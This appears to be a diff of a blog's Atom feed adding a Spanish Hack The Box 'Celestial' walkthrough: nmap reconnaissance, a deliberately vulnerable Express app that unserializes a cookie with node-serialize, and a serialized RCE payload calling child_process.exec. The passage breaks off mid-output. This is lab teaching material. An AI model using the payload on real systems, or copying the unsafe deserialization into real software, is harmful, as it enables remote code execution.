@@ -1,4 +1,342 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-15T01:50:31-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Jerry</title><link href="http://localhost:4000/htb-jerry/" rel="alternate" type="text/html" title="Hack The Box Jerry" /><published>2022-03-15T00:00:00-06:00</published><updated>2022-03-15T00:00:00-06:00</updated><id>http://localhost:4000/htb-jerry</id><content type="html" xml:base="http://localhost:4000/htb-jerry/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/banner-jerry.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-18T00:29:19-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Celestial</title><link href="http://localhost:4000/htb-celestial/" rel="alternate" type="text/html" title="Hack The Box Celestial" /><published>2022-03-18T00:00:00-06:00</published><updated>2022-03-18T00:00:00-06:00</updated><id>http://localhost:4000/htb-celestial</id><content type="html" xml:base="http://localhost:4000/htb-celestial/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-celestial/banner-celestial.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;celestial&quot;&gt;Celestial&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.85.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.85
+PING 10.10.10.85 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.85&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.85: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;137 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.85 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 137.435/137.435/137.435/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.85 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-15 13:33 CST
+Initiating Ping Scan at 13:33
+Scanning 10.10.10.85 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
+Completed Ping Scan at 13:33, 0.15s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating SYN Stealth Scan at 13:33
+Scanning 10.10.10.85 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 3000/tcp on 10.10.10.85
+Completed SYN Stealth Scan at 13:34, 45.26s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.85
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65534 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE
+3000/tcp open  ppp
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;45.55 seconds
+           Raw packets sent: 83595 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.678MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 82630 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.305MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+       │ Size: 115 B
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.85
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 3000
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p3000&lt;/span&gt; 10.10.10.85 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-15 13:35 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.85
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT     STATE SERVICE VERSION
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=utf-8).
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.01 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que se encuentra abierto el puerto 3000 y se encuentra asociado al servicio &lt;strong&gt;&lt;em&gt;Node.js Express framework&lt;/em&gt;&lt;/strong&gt;, del cual si quieremos saber más, podemos consultar el sitio oficial &lt;a href=&quot;https://expressjs.com/es/&quot;&gt;expressjs&lt;/a&gt;. Ahora vamos a buscar si existen exploits públicos que nos ayuden a vulnerar el sitio y encontramos un documento en pdf &lt;a href=&quot;https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf&quot;&gt;41289-exploiting-node.js-deserialization-bug-for-remote-code-execution&lt;/a&gt; del cual no vamos a basar para vulnerar la máquina, incluso montarnos nuestro servidor en local para realizar pruebas.&lt;/p&gt;
+
+&lt;p&gt;Para montarnos nuestro servicio, de acuerdo con lo que nos dice el documento, necesitamos crear el recurso &lt;strong&gt;node.js&lt;/strong&gt; con el siguiente contenido.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cookieParser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cookie-parser&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;escape&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;escape-html&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;node-serialize&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookieParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Hello &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;escape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;maxAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;900000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;httpOnly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Hello World&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Debemos tener instalados los siguiente paquetes:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;npm
+❯ npm &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;node-serialize
+❯ npm &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;express
+❯ npm &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;cookie-parser
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ejecutamos nuestro archivo y tratamos de acceder vía web.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ node node.js
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-celestial/celestial-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si vemos el código del archivo que creamos &lt;strong&gt;node.js&lt;/strong&gt;, vemos una cookie en donde se observa una cadena en base 64; vamos a tratar de ver el contenido.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;ajin&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;country&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;india&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;city&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;bangalore&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que se tienen datos de forma serializada en donde el campo &lt;strong&gt;username&lt;/strong&gt; se observa el dato &lt;strong&gt;ajin&lt;/strong&gt;, el mismo que vemos vía web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-celestial/celestial-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Leyendo el documento, nos proporciona una función para serializar los datos.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;rce&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;child_process&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;ls /&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;node-serialize&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Serialized: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo ejecutamos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ node serialize.js
+Serialized: 
